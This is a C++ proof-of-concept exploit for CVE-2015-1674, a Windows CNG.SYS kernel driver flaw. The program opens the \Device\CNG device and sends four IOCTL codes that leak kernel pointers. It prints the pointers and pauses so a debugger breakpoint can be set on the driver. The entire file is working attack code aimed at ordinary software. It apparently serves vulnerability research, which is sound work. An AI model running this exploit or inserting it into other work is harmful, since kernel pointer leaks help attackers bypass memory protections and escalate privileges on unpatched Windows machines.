// CVE-2015-1674.cpp : This file contains the 'main' function. Program execution begins and ends there.
// Source: https://twitter.com/NTarakanov/status/598370525132423168
// Info: https://support.microsoft.com/en-us/kb/891805

#include "pch.h"
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#pragma  comment(lib, "ntdll.lib")

typedef NTSTATUS(WINAPI * _NtOpenFileStruct)(
	OUT PHANDLE FileHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	IN ULONG ShareAccess,
	IN ULONG OpenOptions
	);

int main(int argc, CHAR* argv[]) {

	_NtOpenFileStruct NtOpenFileStruct;

	HMODULE hModule = LoadLibraryA("ntdll.dll");
	NtOpenFileStruct = (_NtOpenFileStruct)GetProcAddress(hModule, "NtOpenFile");
	if (NtOpenFileStruct == NULL) {
		exit(-1);
	}

	UNICODE_STRING filename;
	RtlInitUnicodeString(&filename, L"\\Device\\CNG");

	OBJECT_ATTRIBUTES object;
	object.Length = 0x18;
	object.RootDirectory = NULL;
	object.ObjectName = &filename;
	object.Attributes = 0x40;
	object.SecurityDescriptor = NULL;
	object.SecurityQualityOfService = NULL;

	IO_STATUS_BLOCK iostatusblock;
	HANDLE pHandle = NULL;
	DWORD dAccess = 0x100001;
	ULONG sAccess = 0x7;
	ULONG oOptions = 0x20;
	NTSTATUS stat = NtOpenFileStruct(&pHandle, dAccess, &object, &iostatusblock, sAccess, oOptions);
	if (NT_SUCCESS(stat)) {
		printf("\n[*] File successfully opened.\n\n");
	}
	else {
		printf("\n[*] File could not be opened.\n\n");
		return -1;
	}

	// Getchar() so you can set a breakpoint
	printf("[*] Setup a breakpoint at IRP_MJ_INTERNAL_DEVICE_CONTROL on the CNG.SYS driver.\n");
	getchar();

	DWORD dwBuffer = 0;
	DWORD dwCnt = 0;

	// First IOCTL Leak
	BOOL  bRet = DeviceIoControl((HANDLE)pHandle, 0x390040, &dwBuffer, 4, &dwBuffer, 4, &dwCnt, NULL);
	if (FALSE == bRet)
	{
		printf("[*] Send IOCTL fail!\n");
		printf("[*] Error Code:%d\n", GetLastError());
	}
	else
	{
		printf("[*] Leaked pointers: 0x%08x", dwBuffer);
		getchar();
	}

	// Second IOCTL Leak
	BOOL  bRet2 = DeviceIoControl((HANDLE)pHandle, 0x390044, &dwBuffer, 4, &dwBuffer, 4, &dwCnt, NULL);
	if (FALSE == bRet2)
	{
		printf("[*] Send IOCTL fail!\n");
		printf("[*] Error Code:%d\n", GetLastError());
	}
	else
	{
		printf("[*] Leaked pointers: 0x%08x", dwBuffer);
		getchar();
	}

	// Third IOCTL Leak
	BOOL  bRet3 = DeviceIoControl((HANDLE)pHandle, 0x390048, &dwBuffer, 4, &dwBuffer, 4, &dwCnt, NULL);
	if (FALSE == bRet3)
	{
		printf("[*] Send IOCTL fail!\n");
		printf("[*] Error Code:%d\n", GetLastError());
	}
	else
	{
		printf("[*] Leaked pointers: 0x%08x", dwBuffer);
		getchar();
	}

	// Fourth IOCTL Leak
	BOOL  bRet4 = DeviceIoControl((HANDLE)pHandle, 0x390064, &dwBuffer, 4, &dwBuffer, 4, &dwCnt, NULL);
	if (FALSE == bRet4)
	{
		printf("[*] Send IOCTL fail!\n");
		printf("[*] Error Code:%d\n", GetLastError());
	}
	else
	{
		printf("[*] Leaked pointers: 0x%08x", dwBuffer);
		getchar();
	}

	CloseHandle(pHandle);
	return 0;
}